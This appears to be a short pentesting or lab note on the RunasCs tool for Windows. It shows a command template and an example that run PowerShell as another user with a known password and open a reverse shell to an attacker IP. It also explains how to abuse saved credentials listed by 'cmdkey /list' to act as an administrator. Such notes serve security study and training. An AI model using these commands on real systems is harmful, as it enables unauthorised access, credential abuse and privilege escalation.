https://github.com/antonioCoco/RunasCs.git
  
- once you have access to a Windows machine, you can use Runas to run another process as another user as long as you have their credentials
    
    - an example would be getting a powershell session with a user that doesn’t have winrm privileges
    
    - ./RunasCS.exe <user_to_run_as> <pass> <file_to_run> -r <attacker_IP>:<port>
        
        - example: RunasCS.exe svc_ldap Password1! powershell.exe -r <IP>
        
    
  
![[../assets/RunasCs/image 250.png|image 250.png]]
- in a svc_winrm session, running powershell with the svc_ldap user to get a rev shell
  
![[../assets/RunasCs/image 1 181.png|image 1 181.png]]
  
if the computer is using runas, they potentially have saved creds, and you can use those saved creds to execute commands you otherwise shouldn’t have
- for example, if the saved creds is for an administrator account, you can have a low level user access
- to check if any creds are saved, use “cmdkey /list”
![[../assets/RunasCs/image 2 155.png|image 2 155.png]]
- with these saved creds, we can do whatever that user can
  
![[../assets/RunasCs/image 3 136.png|image 3 136.png]]